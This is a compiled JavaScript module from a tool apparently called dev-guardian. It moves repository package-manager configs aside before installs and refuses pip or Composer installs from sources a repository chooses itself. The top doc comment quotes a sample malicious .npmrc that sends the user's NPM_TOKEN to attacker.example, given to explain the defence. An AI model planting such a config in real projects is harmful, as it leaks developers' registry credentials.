/**
 * A repository's package-manager configuration decides where a package
 * manager fetches from — and where it sends the user's credentials. A
 * repository `.npmrc` holding
 *
 *     registry=https://attacker.example/
 *     //attacker.example/:_authToken=${NPM_TOKEN}
 *
 * makes every `npm ci`, `npm install`, `npm outdated` and `npm audit` in the
 * checkout fetch from that host with the user's own `NPM_TOKEN` —
 * `--ignore-scripts` does not stop it: it is the fetch. A scoped registry
 * (`@scope:registry=…`) is the same route, and so are Yarn's, pip's, Cargo's,
 * Bundler's and NuGet's own project-level files.
 *
 * `create_fix_pr` works in its own disposable checkouts, so in each one —
 * the fix's worktree, the base-commit tree and the planning tree — every such
 * file is moved out of the tree before any package manager runs, and the
 * user's own configuration then applies:
 *
 *   - `.npmrc`, `.pnpmrc`, `.yarnrc`, `.yarnrc.yml`, `pip.conf`, `pip.ini`,
 *     `.pip/`, `.cargo/config.toml` and `.cargo/config`, `.bundle/config` and
 *     `NuGet.config` (any case), in the project's directory and every
 *     directory above it up to the checkout's root (npm, Cargo and NuGet
 *     read them from there too).
 *
 * The fix's worktree gets them back before anything is committed
 * ({@link SetAside.restore}): the pull request is the fix and nothing else.
 *
 * `composer.json` cannot be moved aside — it IS the manifest the fix edits —
 * so a `repositories` entry in it refuses Composer's part instead
 * ({@link composerChoosesRepository}).
 */
import { mkdtempSync, renameSync, rmSync } from 'node:fs';
import { dirname, join, relative, resolve, sep } from 'node:path';
import { describeReadRefusal, isWithinDir, listProjectDir, readProjectJson, readProjectText } from '../platform/projectFs.js';
/** Names moved aside in each directory, lower-cased (the match is case-insensitive). */
const TOP_LEVEL = new Set(['.npmrc', '.pnpmrc', '.yarnrc', '.yarnrc.yml', 'pip.conf', 'pip.ini', '.pip', 'nuget.config']);
/** `<dir>/<name>` → the files in it that are moved aside. */
const NESTED = {
    '.cargo': new Set(['config.toml', 'config']),
    '.bundle': new Set(['config']),
};
/** The directories from `projectDir` up to and including `root`. */
function dirsUpToRoot(root, projectDir) {
    const out = [];
    const top = resolve(root);
    for (let dir = resolve(projectDir); isWithinDir(top, dir); dir = dirname(dir)) {
        out.push(dir);
        if (dir === top || dirname(dir) === dir)
            break;
    }
    return out;
}
/** Every package-manager configuration path in scope, absolute. */
export function repoPackageConfigPaths(root, projectDir) {
    const out = [];
    for (const dir of dirsUpToRoot(root, projectDir)) {
        for (const entry of listProjectDir(root, dir)) {
            const lower = entry.name.toLowerCase();
            if (TOP_LEVEL.has(lower))
                out.push(join(dir, entry.name));
            const nested = NESTED[lower];
            if (nested !== undefined && entry.kind === 'directory') {
                for (const inner of listProjectDir(root, join(dir, entry.name))) {
                    if (nested.has(inner.name.toLowerCase()))
                        out.push(join(dir, entry.name, inner.name));
                }
            }
        }
    }
    return out;
}
/**
 * Moves every repository package-manager configuration in scope out of the
 * checkout at `root` (see the module doc). A link is moved as a link, never
 * followed. Throws only when a move fails — the caller must not run a
 * package manager in a tree it could not clean.
 */
export function setAsidePackageConfig(root, projectDir) {
    const paths = repoPackageConfigPaths(root, projectDir);
    // Beside the checkout, not in it (a re-scan must not see the files) and not
    // on another volume (a rename moves a link as a link, and a directory whole).
    const holding = paths.length > 0 ? mkdtempSync(join(dirname(resolve(root)), '.guardian-fixpr-config-')) : null;
    const moves = [];
    try {
        paths.forEach((from, i) => {
            if (holding === null)
                return;
            const to = join(holding, String(i));
            renameSync(from, to);
            moves.push({ from, to });
        });
    }
    catch (e) {
        for (const m of moves.reverse())
            renameSync(m.to, m.from);
        if (holding !== null)
            rmSync(holding, { recursive: true, force: true });
        throw e;
    }
    let restored = false;
    return {
        moved: moves.map((m) => relative(resolve(root), m.from).split(sep).join('/')),
        restore: () => {
            if (restored)
                return;
            restored = true;
            for (const m of [...moves].reverse())
                renameSync(m.to, m.from);
        },
        dispose: () => {
            if (holding !== null)
                rmSync(holding, { recursive: true, force: true, maxRetries: 3, retryDelay: 50 });
        },
    };
}
/**
 * Why Composer must not run in this checkout — `composer.json` declares its
 * own `repositories` (a package source the repository chose, which the fix
 * cannot remove without also editing the manifest it commits) — or null.
 */
export function composerChoosesRepository(projectDir) {
    const manifest = readProjectJson(projectDir, 'composer.json');
    if (typeof manifest !== 'object' || manifest === null)
        return null;
    const repos = manifest['repositories'];
    const declared = Array.isArray(repos) ? repos.length > 0 : typeof repos === 'object' && repos !== null && Object.keys(repos).length > 0;
    return declared
        ? "the project's composer.json declares its own package repositories; dev-guardian doesn't install from a repository-chosen source"
        : null;
}
// ------------------------------------------------------------------ pip
/** pip's options that choose where packages come from. */
const INDEX_OPTION = /^\s*(?:-[if](?![A-Za-z-])|-[if]\S|--(?:index-url|extra-index-url|find-links|trusted-host)(?=[\s=]|$))/;
/** `-r` / `--requirement` / `-c` / `--constraint`, and the file they name. */
const INCLUDE = /^\s*(?:-[rc](?![A-Za-z-])\s*=?\s*|-[rc](?=\S)|--(?:requirement|constraint)(?:\s*=\s*|\s+))(\S+)/;
/**
 * A requirement that pip fetches from a host the LINE names, not from an
 * index — as much the repository's choice of where the user's machine
 * downloads (and builds) code from as `--index-url`, and refused the same
 * way (review of 3.0, W2E). Each is `[what it is, pattern]`; the pattern's
 * first group is the URL. `file:` URLs and plain paths are local and pass:
 *
 *   - a VCS URL, alone, after `-e` / `--editable`, or as a direct reference:
 *     `git+https://…`, `hg+…`, `svn+…`, `bzr+…`, any transport;
 *   - a PEP 508 direct reference: `name @ https://…` (extras and markers
 *     allowed);
 *   - a bare URL, alone or after `-e` / `--editable`: `https://…/pkg.tar.gz`;
 *   - an include of a URL: `-r https://…/requirements.txt`, `-c …`, which
 *     pip downloads and then reads — its lines unseen here.
 */
const REMOTE_SOURCES = [
    ['a VCS URL', /(?:^|[\s@=])((?:git|hg|svn|bzr)\+\S+)/i],
    ['a direct reference', /^\s*[A-Za-z0-9][A-Za-z0-9._-]*\s*(?:\[[^\]]*\])?\s*@\s*((?!file:)\S+)/i],
    ['a URL', /^\s*(?:(?:-e|--editable)(?:\s*=\s*|\s+))?((?!file:)[a-z][a-z0-9+.-]*:\/\/\S+)/i],
    ['an include from a URL', /^\s*(?:-[rc]|--requirement|--constraint)(?:\s*=\s*|\s*)((?!file:)[a-z][a-z0-9+.-]*:\/\/\S+)/i],
];
/** `scheme://host` of a URL for a result — never its path, query or credentials. */
function urlHost(url) {
    const m = /^((?:[a-z]+\+)?[a-z][a-z0-9+.-]*:\/\/)(?:[^@/?#]*@)?([^/?#:]*)/i.exec(url);
    return m !== null ? `${m[1] ?? ''}${m[2] ?? ''}` : url.split(/[/?#]/)[0] ?? url;
}
/** The first remote source on a (comment-stripped) requirement line, described. */
function remoteSourceOn(line) {
    for (const [what, re] of REMOTE_SOURCES) {
        const url = re.exec(line)?.[1];
        if (url !== undefined)
            return `${what} (${urlHost(url)})`;
    }
    return null;
}
/** The requirement files the re-scan's pip-audit reads, as `deps_audit` finds them. */
function rootRequirementFiles(projectDir) {
    const out = [];
    for (const { name } of listProjectDir(projectDir, projectDir)) {
        if (/^requirements.*\.txt$/i.test(name))
            out.push(name);
    }
    for (const { name } of listProjectDir(projectDir, join(projectDir, 'requirements'))) {
        if (name.toLowerCase().endsWith('.txt'))
            out.push(`requirements/${name}`);
    }
    return out;
}
/**
 * The first requirement file — among the project's own and every file they
 * include with `-r` or `-c`, constraints included — that chooses where pip
 * installs from, or null:
 *
 *   - `index`: a package-index option (`-i`, `--index-url`,
 *     `--extra-index-url`, `-f`, `--find-links`, `--trusted-host`), as
 *     `<file>: <option>`;
 *   - `remote`: a line that fetches from a host it names — a VCS URL, a
 *     direct reference, a bare URL, an include from a URL
 *     ({@link REMOTE_SOURCES}) — as `<file>: <what> (<scheme>://<host>)`;
 *   - `unchecked`: a file in that set that is there and could not be read
 *     (a FIFO, over the size cap, a link out of the checkout), or an include
 *     that leaves the checkout — pip would read it, so "chooses nothing"
 *     cannot be said of it.
 *
 * `extra` names more files to start from (a fix's own requirements file).
 * Read through `platform/projectFs.ts`, contained in `checkoutRoot` (the
 * whole checkout the project sits in — a monorepo's `-r ../shared/…` is the
 * repository's too); `projectDir` when not given.
 */
export function requirementsChooseSource(projectDir, extra = [], checkoutRoot = projectDir) {
    const queue = [...new Set([...rootRequirementFiles(projectDir), ...extra])];
    const seen = new Set();
    const shown = (key) => relative(projectDir, key).split(sep).join('/');
    for (let file = queue.shift(); file !== undefined; file = queue.shift()) {
        const key = resolve(projectDir, file);
        if (seen.has(key) || seen.size > 200)
            continue;
        seen.add(key);
        const read = readProjectText(checkoutRoot, key, MAX_REQUIREMENTS_BYTES);
        if (read.status === 'absent')
            continue;
        if (read.status === 'refused')
            return { where: `${shown(key)}: ${describeReadRefusal(read.reason)}`, kind: 'unchecked' };
        // A `\` at the end of a line continues it (pip's own rule).
        for (const raw of read.text.replace(/\\\r?\n/g, ' ').split(/\r?\n/)) {
            const line = raw.replace(/(^|\s)#.*$/, '');
            const option = INDEX_OPTION.exec(line);
            if (option !== null) {
                const name = option[0].trim().split(/[\s=]/)[0] ?? option[0].trim();
                return { where: `${shown(key)}: ${name.startsWith('--') ? name : name.slice(0, 2)}`, kind: 'index' };
            }
            const remote = remoteSourceOn(line);
            if (remote !== null)
                return { where: `${shown(key)}: ${remote}`, kind: 'remote' };
            const include = INCLUDE.exec(line);
            if (include?.[1] !== undefined)
                queue.push(relative(projectDir, resolve(dirname(key), include[1])));
        }
    }
    return null;
}
/** {@link requirementsChooseSource}'s `where` for an index option only; null for anything else. */
export function requirementsChooseIndex(projectDir, extra = []) {
    const choice = requirementsChooseSource(projectDir, extra);
    return choice?.kind === 'index' ? choice.where : null;
}
/** The largest requirements file read; a real one is a few KB. */
const MAX_REQUIREMENTS_BYTES = 4 * 1024 * 1024;
/** The refusal reason for a repository-chosen pip index. */
export function pipIndexRefusal(where) {
    return `the project's requirements choose a package index (${where}); dev-guardian doesn't install from a repository-chosen index`;
}
/** The refusal reason for any {@link PipSourceChoice}. */
export function pipSourceRefusal(choice) {
    switch (choice.kind) {
        case 'index':
            return pipIndexRefusal(choice.where);
        case 'remote':
            return (`the project's requirements fetch from a host they name (${choice.where}); ` +
                "dev-guardian doesn't install from a repository-chosen source");
        case 'unchecked':
            return (`the project's requirements could not all be read to check where they install from (${choice.where}); ` +
                "dev-guardian doesn't install from requirements it cannot check");
    }
}
/**
 * Why a group must not be attempted in this checkout, or null: a Composer
 * step where `composer.json` declares its own repositories
 * ({@link composerChoosesRepository}); or a pip step, or a re-scan by
 * `deps_audit` (whose pip-audit installs every requirements file into a
 * temporary virtualenv — running an sdist's build code), where the
 * requirements choose a package index, fetch from a host a line names, or
 * cannot all be read to check ({@link requirementsChooseSource}).
 * `checkoutRoot`: the whole checkout `projectDir` sits in, which the
 * requirements files are read within.
 */
export function installRefusal(opts) {
    if (opts.stepEcosystems.includes('composer')) {
        const composer = composerChoosesRepository(opts.projectDir);
        if (composer !== null)
            return composer;
    }
    if (opts.stepEcosystems.includes('pip') || opts.rescanTools.includes('deps_audit')) {
        const choice = requirementsChooseSource(opts.projectDir, opts.stepFiles.filter((f) => /\.(txt|in)$/i.test(f)), opts.checkoutRoot ?? opts.projectDir);
        if (choice !== null)
            return pipSourceRefusal(choice);
    }
    return null;
}
//# sourceMappingURL=repoPackageConfig.js.map